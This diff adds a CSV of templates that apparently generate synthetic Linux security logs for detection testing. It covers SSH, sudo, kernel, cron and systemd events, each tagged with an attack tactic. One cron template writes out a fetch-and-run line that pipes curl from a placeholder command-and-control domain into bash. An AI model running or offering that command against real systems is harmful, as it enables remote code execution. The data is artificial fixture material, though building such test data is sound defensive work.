@@ -1,0 +1,12 @@
+id,source,category,event_group,event_name,severity,action,weight,template,tags,ttp
+linux_ssh_001,linux,ssh,ssh,SSH failed password,medium,failure,10,"sshd[{pid}]: Failed password for invalid user {username} from {src_ip} port {src_port} ssh2","linux,ssh","credential-access"
+linux_auth_001,linux,auth,auth,Successful SSH login,low,success,6,"sshd[{pid}]: Accepted publickey for {username} from {src_ip} port {src_port} ssh2","linux,auth,ssh","initial-access"
+linux_auth_002,linux,auth,auth,User account locked,medium,modify,5,"pam_tally2(login:auth): user {username} ({src_ip}) tally {pid}, deny 5","linux,auth,pam","credential-access"
+linux_sudo_001,linux,sudo,sudo,Sudo command executed,medium,execute,8,"sudo: {username} : TTY=pts/0 ; PWD=/home/{username} ; USER=root ; COMMAND=/bin/bash -c '{command_line}'","linux,sudo,privilege","privilege-escalation"
+linux_sudo_002,linux,sudo,sudo,Sudo authentication failure,high,failure,9,"sudo: pam_unix(sudo:auth): authentication failure; logname={username} uid=1001 euid=0 tty=/dev/pts/0 ruser={username} rhost={src_ip}","linux,sudo,auth-fail","credential-access"
+linux_kernel_001,linux,kernel,kernel,Kernel module loaded,medium,load,7,"kernel: module {malware_family} loaded by {username} pid={pid} src={src_ip}","linux,kernel,module","defense-evasion"
+linux_kernel_002,linux,kernel,kernel,Suspicious segfault,high,crash,6,"kernel: {hostname}[{pid}]: segfault at {src_ip} ip 00007f{opid} sp 00007f{pid} error 4 in libc-2.31.so","linux,kernel,segfault","impact"
+linux_cron_001,linux,cron,cron,Suspicious cron job created,high,create,8,"CRON[{pid}]: ({username}) CMD (curl -fsSL http://{c2_domain}/update.sh | bash) src={src_ip}","linux,cron,persistence","persistence"
+linux_cron_002,linux,cron,cron,Cron execution error,medium,error,6,"CRON[{pid}]: ({username}) ERROR (failed command '/usr/bin/python3 /tmp/{malware_name}.py') src={src_ip}","linux,cron,error","execution"
+linux_systemd_001,linux,systemd,systemd,New systemd service installed,high,create,8,"systemd[1]: Created symlink /etc/systemd/system/multi-user.target.wants/{malware_name}.service -> /etc/systemd/system/{malware_name}.service (user={username} src={src_ip})","linux,systemd,persistence","persistence"
+linux_systemd_002,linux,systemd,systemd,Service restart storm,medium,restart,5,"systemd[1]: {malware_name}.service: Scheduled restart job, restart counter is {opid} (host={hostname} src={src_ip})","linux,systemd,restart","impact"
